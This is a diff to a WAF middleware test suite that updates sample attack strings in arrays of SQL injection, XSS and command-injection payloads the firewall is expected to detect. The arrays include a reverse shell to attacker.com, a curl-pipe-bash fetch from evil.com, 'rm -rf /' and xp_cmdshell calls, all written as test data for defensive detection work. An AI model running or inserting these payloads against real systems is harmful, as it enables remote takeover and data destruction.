@@ -154,7 +154,7 @@ describe("WAF Middleware", () => {
       "'; EXEC xp_cmdshell('dir')--",
       "1' WAITFOR DELAY '0:0:10'--",
       "1' ORDER BY 1--",
-      "BENCHMARK(10000000,SHA1('test'))",
+      "BENCHMARK(10000000,SHA256('test'))",
     ];
 
     it.each(sqlInjectionPayloads)(
@@ -200,7 +200,7 @@ describe("WAF Middleware", () => {
       "<iframe src='javascript:alert(1)'>",
       "<div style='background:url(javascript:alert(1))'>",
       "'-alert(1)-'",
-      "<script src='http://evil.com/xss.js'></script>",
+      "<script src='https://evil.com/xss.js'></script>",
     ];
 
     it.each(xssPayloads)("should detect XSS attack: %s", (payload) => {
@@ -228,7 +228,7 @@ describe("WAF Middleware", () => {
       "&& rm -rf /",
       "|| ping -c 10 evil.com",
       "; nc -e /bin/sh attacker.com 4444",
-      "| curl http://evil.com/shell.sh | bash",
+      "| curl https://evil.com/shell.sh | bash",
     ];
 
     it.each(commandInjectionPayloads)(
